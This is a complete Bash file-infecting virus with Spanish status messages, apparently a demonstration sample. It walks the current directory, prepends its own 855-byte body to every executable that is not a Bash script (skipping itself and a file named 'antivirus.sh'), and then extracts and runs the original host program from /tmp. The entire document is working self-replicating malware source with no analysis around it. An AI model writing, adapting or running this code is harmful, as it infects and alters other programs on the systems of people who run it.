#!/bin/bash

TAM=855

for name in *
do

	echo -n "Localizado fichero: " $name

	if [ ! -x $name ];then

		echo -e "\t[NO]"
		continue

	fi

	echo -e "\t[EJECUTABLE]"

	if [ "./$name" = $0 ]; then

		echo "Esquivando el propio programa..."
		continue

	fi

	if [ "antivirus.sh" = $name ]; then

		echo "Esquivando el antivirus"
		continue

	fi

	MAGIC=$( head -n 1 $name | cut -c 1-11 | tr -d '\0' )
 
	if [ "$MAGIC" = "#!/bin/bash" ];then

		echo "Esquivando script shell..."
		continue

	fi

	echo "Infectando: " $name

	#cat $0 $name > /tmp/infectado
	dd if=$0 of=/tmp/infectado bs=1 count=$TAM >/dev/null 2>&1
	cat /tmp/infectado $name > /tmp/infectado2
	mv /tmp/infectado2 $name
	chmod +x $name

done

echo "Ejecutando payload..."

dd if=$0 of=/tmp/extraido bs=1 skip=$TAM >/dev/null 2>&1
chmod +x /tmp/extraido
/tmp/extraido
rm /tmp/extraido


exit

